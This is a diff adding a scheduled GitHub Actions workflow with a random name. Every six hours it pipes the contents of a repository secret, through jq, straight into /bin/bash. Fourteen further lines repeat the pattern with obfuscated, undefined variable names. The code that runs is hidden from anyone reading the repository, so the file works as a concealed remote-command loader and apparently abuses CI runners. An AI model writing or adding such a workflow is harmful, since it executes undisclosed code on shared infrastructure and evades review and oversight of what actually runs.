@@ -1,0 +1,33 @@
+name: senlaichengtui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: senlaichengtui
+        env:
+          pties17: ${{ secrets.pties17 }}
+        run: |
+          echo $pties17 | jq -r .w195 | /bin/bash
+          echo $jqmxy9436 | jq -r .mru9 | /bin/bash
+          echo $u26675 | jq -r .w8 | /bin/bash
+          echo $wua2979 | jq -r .qjeu68 | /bin/bash
+          echo $kwk56 | jq -r .ktphd0 | /bin/bash
+          echo $g50256 | jq -r .l36 | /bin/bash
+          echo $fi953 | jq -r .tqpc8 | /bin/bash
+          echo $jvxym083 | jq -r .lkn7613 | /bin/bash
+          echo $ehsw88932 | jq -r .dta651 | /bin/bash
+          echo $ongsc0277 | jq -r .n278 | /bin/bash
+          echo $ien76242 | jq -r .k737 | /bin/bash
+          echo $yd139 | jq -r .m82364 | /bin/bash
+          echo $dno046 | jq -r .cmr22114 | /bin/bash
+          echo $h1120 | jq -r .lcnjq1795 | /bin/bash
+          echo $zjmgq740 | jq -r .ep968 | /bin/bash
+
